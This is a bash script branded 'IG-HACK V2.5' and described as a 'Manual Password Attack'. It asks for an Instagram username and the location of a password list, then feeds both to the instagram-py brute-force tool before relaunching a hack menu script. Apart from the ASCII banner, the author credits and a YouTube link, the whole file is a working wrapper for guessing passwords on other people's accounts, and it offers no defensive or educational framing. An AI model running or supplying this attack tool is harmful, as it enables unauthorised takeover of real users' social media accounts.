#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
    ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██║██║  ███╗█████╗███████║███████║██║V2.5 █████╔╝
    ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
    ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m    >>                         AUTHOR:Mr.XxX                            << \e[0m\n"
printf "                \e[101m\e[1;34m    >> Thanks to and support:Zxce3,Xperson404,Xmondardo,M1N4T0,Kiddrock << \e[0m\n"
printf "                \e[101m\e[1;77m    >> Team :              Cyber Error Sytem Team                       << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;31m youtube.com/channel/UCE56kwJEuHbNd3xHbTarmAw \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 30.0
cd $HOME
fi
sleep 30.0
cd $HOME/ighack
bash ighack.sh
